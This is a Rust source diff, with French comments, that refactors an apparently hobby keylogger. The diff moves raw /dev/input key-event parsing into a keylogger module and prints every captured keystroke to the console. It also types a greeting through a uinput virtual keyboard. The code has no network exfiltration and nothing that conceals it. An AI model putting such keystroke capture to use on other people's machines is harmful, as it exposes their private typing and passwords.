@@ -1,14 +1,12 @@
-use byteorder::{NativeEndian, ReadBytesExt};
-use std::fs::OpenOptions;
-use std::io::{Cursor, Read};
-use std::path::Path;
-use std::thread;
-mod keylogger;
-mod virtual_input;
 use std::collections::HashMap;
 
+use std::path::Path;
+use std::thread;
 use uinput::event::keyboard;
 use uinput::Device;
+
+mod keylogger;
+mod virtual_input;
 
 fn main() {
     // init uinput
@@ -23,10 +21,9 @@ fn main() {
 
     virtual_input::write_word("Bonjour Noopy".to_string(), &mut device, &keycode_uinput);
 
-    println!("\nLancement de la détection des touches !");
+    // println!("\nLancement de la détection des touches !");
 
-    // Récupération des détails système avec les chemins des périphériques d'entrée
-
+    // Récupération des chemins des périphériques d'entrée
     let event_paths: Vec<String> = keylogger::list_keyboards();
 
     let mut handles = vec![];
@@ -37,46 +34,12 @@ fn main() {
         let keycode_map = keycode_map.clone(); // Clone le keycode_map pour chaque thread
 
         let handle = thread::spawn(move || {
-            let mut file_options = OpenOptions::new();
-            file_options.read(true).write(false).create(false);
-
-            let mut event_file = match file_options.open(&path) {
-                Ok(file) => file,
-                Err(err) => {
-                    eprintln!("Erreur lors de l'ouverture du fichier {:?} : {}", path, err);
-                    return;
-                }
-            };
-
-            let mut packet = [0u8; 24];
             loop {
-                if let Err(err) = event_file.read_exact(&mut packet) {
-                    eprintln!(
-                        "Erreur lors de la lecture des données dans {:?} : {}",
-                        path, err
-                    );
-                    break;
+                if let Some(letter) = keylogger::get_pressed_key(&path, &keycode_map) {
+                    println!("{}", letter); // Affiche la lettre récupérée
                 }
-
-                let mut rdr = Cursor::new(packet);
-                let _tv_sec = rdr.read_u64::<NativeEndian>().unwrap();
-                let _tv_usec = rdr.read_u64::<NativeEndian>().unwrap();
-                let evtype = rdr.read_u16::<NativeEndian>().unwrap();
-                let code = rdr.read_u16::<NativeEndian>().unwrap();
-                let value = rdr.read_i32::<NativeEndian>().unwrap();
-
-                if evtype == 1 && value == 1 {
-                    // Vérifie si c'est un événement de type touche (EV_KEY)
-                    match keycode_map.get(&code) {
-                        Some(letter) => {
-                            println!("{}", letter);
-                        }
-                        None => println!(
-                            "Chemin {:?} : Aucune lettre trouvée pour le keycode {}",
-                            path, code
-                        ),
-                    }
-                }
+                // Pour éviter une surcharge inutile du CPU
+                thread::sleep(std::time::Duration::from_millis(10));
             }
         });
 
@@ -85,6 +48,6 @@ fn main() {
 
     // Attendre la fin de tous les threads avant de quitter
     for handle in handles {
-        handle.join().unwrap();
+        handle.join().expect("Le thread a rencontré une erreur.");
     }
 }
